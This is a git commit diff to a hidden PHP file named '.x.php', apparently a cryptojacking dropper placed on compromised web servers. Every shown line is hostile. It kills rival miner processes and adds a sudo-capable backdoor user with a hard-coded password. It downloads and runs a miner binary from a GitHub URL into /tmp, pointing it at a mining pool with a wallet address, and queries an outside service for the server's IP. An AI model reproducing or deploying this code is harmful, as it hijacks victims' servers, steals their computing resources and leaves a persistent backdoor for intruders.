636d18a0d9dac19b831934ce12e7b0ccc522e168
Ananda Ariwibawa <47255603+cafcbr40ck@users.noreply.github.com>
2021-06-20 18:43:55 +0700

    Update .x.php

--- .x.php
+++ .x.php
@@ -2,9 +2,9 @@
 echo '<center><h1>PASUKAN BERANI MATI</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] ';
 exec("ps -ef|awk '/upgrade|update|xmrig|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' |xargs kill -9");
 if(in_array  ('curl', get_loaded_extensions())){
-	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; curl -o sysls.tar.gz https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
+	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; curl -o sysls.tar.gz https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass '.php_uname('n').' --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
 } else {
-	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
+	system('useradd code87; echo "code87:idbteam" | chpasswd; sudo adduser code87 sudo; cd /tmp; wget https://raw.githubusercontent.com/cafcbr40ck/PasukanBeraniMati/main/sysls.tar.gz; tar -zxf sysls.tar.gz; ./sysls --url pool.hashvault.pro:80 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass '.php_uname('n').' --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14');
 }
 $sys = php_uname();
 $lihat = system('curl ipecho.net/plain');
